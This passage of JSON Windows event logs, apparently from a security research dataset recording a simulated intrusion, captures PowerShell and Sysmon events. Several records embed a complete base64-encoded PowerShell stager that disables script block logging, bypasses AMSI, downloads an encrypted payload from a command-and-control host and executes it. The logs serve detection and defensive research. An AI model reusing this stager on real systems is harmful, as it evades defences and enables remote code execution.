QBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","@timestamp":"2020-09-22T08:22:43.275Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240723,"Task":6,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Provider Lifecycle","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":400,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Message":"Engine state is changed from None to Available. \r\n\r\nDetails: \r\n\tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=28383\r\n\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=50f3d352-332d-4cc2-9811-b903295a8adb\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","@timestamp":"2020-09-22T08:22:43.275Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240724,"Task":4,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Engine Lifecycle","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"TargetObject":"HKU\\S-1-5-21-4228717743-1032521047-1810997296-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","EventTypeOrignal":"INFO","EventID":12,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"host":"wec.internal.cloudapp.net","Channel":"Microsoft-Windows-Sysmon/Operational","UserID":"S-1-5-18","AccountType":"User","ThreadID":4048,"ProcessGuid":"{b34bc01c-a92a-5f69-7e02-000000000900}","EventReceivedTime":"2020-09-22 04:22:43","Opcode":"Info","EventTime":"2020-09-22 04:22:42","@timestamp":"2020-09-22T08:22:43.278Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399201,"Task":12,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":2,"Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Category":"Registry object added or deleted (rule: RegistryEvent)","UtcTime":"2020-09-22 08:22:42.447","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"TargetObject":"HKU\\S-1-5-21-4228717743-1032521047-1810997296-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","EventTypeOrignal":"INFO","EventID":12,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"host":"wec.internal.cloudapp.net","Channel":"Microsoft-Windows-Sysmon/Operational","UserID":"S-1-5-18","AccountType":"User","ThreadID":4048,"ProcessGuid":"{b34bc01c-a92a-5f69-7e02-000000000900}","EventReceivedTime":"2020-09-22 04:22:43","Opcode":"Info","EventTime":"2020-09-22 04:22:42","@timestamp":"2020-09-22T08:22:43.279Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399202,"Task":12,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":2,"Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Category":"Registry object added or deleted (rule: RegistryEvent)","UtcTime":"2020-09-22 08:22:42.678","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1000-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:42","EventReceivedTime":"2020-09-22 04:22:43","@timestamp":"2020-09-22T08:22:43.279Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399203,"SourceProcessId":"908","SourceThreadId":"7520","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-5500-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3308","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 08:22:42.678","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1000-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:42","EventReceivedTime":"2020-09-22 04:22:43","@timestamp":"2020-09-22T08:22:43.279Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399204,"SourceProcessId":"908","SourceThreadId":"7520","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-5500-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3308","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 08:22:42.678","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
